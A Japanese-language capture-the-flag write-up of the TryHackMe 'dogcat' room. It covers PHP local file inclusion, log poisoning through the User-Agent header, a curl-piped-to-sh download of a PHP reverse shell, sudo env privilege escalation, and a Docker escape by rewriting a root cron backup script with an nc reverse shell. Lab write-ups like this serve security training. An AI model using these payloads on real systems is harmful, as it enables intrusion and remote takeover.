# dogcat CTF

https://tryhackme.com/room/dogcat

## Enumeration

```shell
TARGET=10.10.108.138
sudo bash -c "echo $TARGET   dogcat.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 60
```

SSH, HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://dogcat.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cat.php              (Status: 200) [Size: 26]
/cats                 (Status: 301) [Size: 307] [--> http://dogcat.thm/cats/]
/dog.php              (Status: 200) [Size: 26]
/dogs                 (Status: 301) [Size: 307] [--> http://dogcat.thm/dogs/]
/flag.php             (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 418]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

dog ボタンを押したら /dogs 内の画像がランダムに、cat ボタンを押したら /cats 内の画像がランダムに表示される。

view パラメータに dog,cat 以外を使えるかファジングしたところ、おもしろい結果になった。

```sh
$ ffuf -u http://dogcat.thm/?view=FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -fs 455

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dogcat.thm/?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 455
________________________________________________

Education               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 262ms]
Publications            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 262ms]
_catalogs               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 263ms]
acatalog                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 263ms]
alcatel                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 262ms]
application             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 262ms]
application.wadl        [Status: 200, Size: 775, Words: 106, Lines: 24, Duration: 262ms]
applications            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 263ms]
authentication          [Status: 200, Size: 771, Words: 106, Lines: 24, Duration: 263ms]
cat                     [Status: 200, Size: 456, Words: 75, Lines: 21, Duration: 265ms]
catalog                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 266ms]
catalogs                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 266ms]
catalog.wci             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 266ms]
catalogsearch           [Status: 200, Size: 769, Words: 106, Lines: 24, Duration: 264ms]
catalogue               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 265ms]
catalyst                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 266ms]
catch                   [Status: 200, Size: 753, Words: 106, Lines: 24, Duration: 264ms]
categoria               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 264ms]
categories              [Status: 200, Size: 763, Words: 106, Lines: 24, Duration: 264ms]
category                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 263ms]
catinfo                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 264ms]
cats                    [Status: 200, Size: 751, Words: 106, Lines: 24, Duration: 264ms]
certificate             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 265ms]
certificates            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 264ms]
certification           [Status: 200, Size: 769, Words: 106, Lines: 24, Duration: 265ms]
communication           [Status: 200, Size: 769, Words: 106, Lines: 24, Duration: 265ms]
communications          [Status: 200, Size: 771, Words: 106, Lines: 24, Duration: 265ms]
communicator            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 267ms]
comunicator             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 265ms]
education               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 264ms]
fcategory               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 264ms]
icat                    [Status: 200, Size: 751, Words: 106, Lines: 24, Duration: 264ms]
locations               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 263ms]
location                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 264ms]
locator                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 263ms]
netcat                  [Status: 200, Size: 755, Words: 106, Lines: 24, Duration: 263ms]
notification            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 263ms]
notifications           [Status: 200, Size: 769, Words: 106, Lines: 24, Duration: 264ms]
publications            [Status: 200, Size: 767, Words: 106, Lines: 24, Duration: 263ms]
publication             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 264ms]
replicate               [Status: 200, Size: 761, Words: 106, Lines: 24, Duration: 289ms]
replication             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 263ms]
replicator              [Status: 200, Size: 763, Words: 106, Lines: 24, Duration: 263ms]
replicated              [Status: 200, Size: 763, Words: 106, Lines: 24, Duration: 1108ms]
showcat                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 264ms]
syndication             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 263ms]
tomcat                  [Status: 200, Size: 755, Words: 106, Lines: 24, Duration: 263ms]
uncategorized           [Status: 200, Size: 769, Words: 106, Lines: 24, Duration: 267ms]
tomcat-docs             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 2016ms]
:: Progress: [4744/4744] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

cat が含まれてさえいれば、include される。

?view=tomcat とすると、下記エラーが表示された。

```
Warning: include(tomcat.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'tomcat.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

http://dogcat.thm/?view=../../../../etc/passwd%00cat  
エラー内容を見る限り、PHP 5.3.4 以降で NULL 文字が使えないパターンと思われる。（ファイルパスとしては NULL 文字入りで評価されるため開けないが、エラー出力は NULL 文字で切れているだけ）

```
Warning: include(): Failed opening '../../../../etc/passwd' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

末尾の .php は回避できそうにないので、PHP を解析する。

flag.php

http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=cats/../flag でフラグ 1 取得。

index.php

http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=cats/../index

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

ext パラメータで、拡張子を指定できることが分かった。

http://dogcat.thm/?view=cats/../../../../../etc/passwd&ext=

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

data:スキームは機能しない。  
http://dogcat.thm/?view=php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==&ext=

```
<b>Warning</b>:  include(php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==): failed to open stream: operation failed in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'php://filter/convert.base64-decode/resource=data://plain/cat,PD89IGAkX0dFVFswXWA/Pg==' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />
```

これでログ表示されているので、ログポイズニングを試みる。  
http://dogcat.thm/?view=cats/../../../../../var/log/apache2/access&ext=.log

```sh
$ nc 10.10.75.45 80
<?=`$_GET[0]`?>
```

で送ったが、これはログに出ていなかった。また、URL の一部として送ってみたが、エンコードされたり削除されてから出力されていた。

```
"GET /%3C?=`$_GET[0]`?%3E HTTP/1.1"
```

ログの項目をみると、User-Agentが出力されている。

```
127.0.0.1 - - [14/Jun/2025:00:41:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 
```

User-Agentをポイズニング。BurpProxyで置き換えた。

```
GET / HTTP/1.1
Host: dogcat.thm
User-Agent: <?=`$_GET[0]`?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

phpコマンドのリバースシェル shell.sh をホストする。

```
php -r '$sock=fsockopen("10.13.85.243",6666);system("sh <&3 >&3 2>&3");'
```

curlでダウンロードさせ、実行。  
http://dogcat.thm/?view=cats/../../../../../var/log/apache2/access&ext=.log&0=curl%20http://10.13.85.243:8000/shell.sh%20|%20sh

シェル取得。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.230.38] 46878
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

env を root として実行可能。

```sh
sudo -l
Matching Defaults entries for www-data on 9858b2bd3e38:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 9858b2bd3e38:
    (root) NOPASSWD: /usr/bin/env
```

昇格。

```sh
sudo env /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
ls -al /root
total 20
drwx------ 1 root root 4096 Mar 10  2020 .
drwxr-xr-x 1 root root 4096 Jun 14 00:57 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-r-------- 1 root root   35 Mar 10  2020 flag3.txt
cat /root/flag3.txt
THM{...........................}
```

どこかでフラグ２を見逃したらしい。

```sh
find / -name 'flag*' -type f 2>/dev/null; echo XXXXXX
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/root/flag3.txt
```

フラグ２回収。

```sh
cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{..................}
```

## Dockerエスケープ

ホストOSで実行するシェルのように見える。

```sh
ls -al /opt/backups
total 2892
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
drwxr-xr-x 1 root root    4096 Jun 14 00:57 ..
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Jun 14 01:45 backup.tar

cat /opt/backups/backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

backup.sh を変更

```sh
echo "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 8888 >/tmp/f" > /opt/backups/backup.sh
```

rootシェル取得

```sh
$ nc -nlvp 8888               
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.230.38] 46284
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
# ls -al /root
total 40
drwx------  6 root root 4096 Apr  8  2020 .
drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr  8  2020 .cache
drwxr-xr-x  5 root root 4096 Mar 10  2020 container
-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
drwx------  3 root root 4096 Apr  8  2020 .gnupg
drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
# cat /root/flag4.txt
THM{...........................................................}
```

## 振り返り

- User-Agentでログポイズニングするパターンは初見と思われる。curl や nc ではなかなかうまくいかずかなり時間がかかった。結局、BurpProxyでインターセプトするのが楽だった。
